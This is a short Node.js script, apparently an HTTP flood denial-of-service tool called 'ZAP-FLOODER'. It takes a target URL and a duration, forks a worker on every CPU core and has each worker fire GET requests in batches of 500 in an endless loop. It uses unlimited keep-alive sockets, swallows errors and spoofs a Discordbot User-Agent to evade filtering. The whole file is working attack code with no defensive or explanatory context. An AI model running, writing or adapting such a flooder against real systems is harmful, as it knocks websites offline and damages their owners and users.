const http = require('http');
const https = require('https');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const duration = parseInt(process.argv[3]) || 60;

if (!target) {
    console.log("Usage: node thisfile.js <target> <duration>");
    process.exit(1);
}

const numCPUs = os.cpus().length;

if (cluster.isPrimary) {
    console.clear();
    console.log(`ZAP-FLOODER LAUNCHING ON ${numCPUs} CORES`);
    console.log(`TARGET: ${target}`);
    console.log(`DURATION: ${duration}s`);

    for (let i = 0; i < numCPUs; i++) cluster.fork();

    setTimeout(() => {
        console.log("Attack ended.");
        process.exit(0);
    }, duration * 1000);

} else {
    const url = new URL(target.startsWith("http") ? target : `http://${target}`);
    const client = url.protocol === 'https:' ? https : http;

    const agent = new (client.Agent)({
        keepAlive: true,
        maxSockets: Infinity,
    });

    function flood() {
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname || "/",
            method: 'GET',
            headers: {
                'User-Agent': 'Discordbot/2.0 (+https://discordapp.com)',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            },
            agent: agent
        };

        for (let i = 0; i < 500; i++) {
            const req = client.request(options, () => {});
            req.on('error', () => {});
            req.end();
        }

        setImmediate(flood);
    }

    flood();
}
